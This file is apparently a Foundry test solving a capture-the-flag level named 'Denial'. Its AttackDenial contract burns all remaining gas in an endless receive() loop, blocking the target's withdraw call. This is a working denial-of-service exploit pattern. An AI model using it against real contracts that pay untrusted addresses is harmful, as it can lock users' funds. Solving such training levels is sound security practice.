// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level20.sol";
import "forge-std/Test.sol";

contract ExploitLevel20 is Test {
    Denial instance = new Denial();
    AttackDenial attackD = new AttackDenial(instance);

    function setUp() external {}

    function testExploit() external {
        instance.setWithdrawPartner(address(attackD));
        instance.withdraw();
    }
}

contract AttackDenial {
    uint256 dummy;
    Denial instance = new Denial();

    constructor(Denial _instance) {
        instance = _instance;
    }

    receive() external payable {
        while (true) {
            dummy = type(uint256).max;
            console.log("Gas Left", gasleft());
        }
    }
}
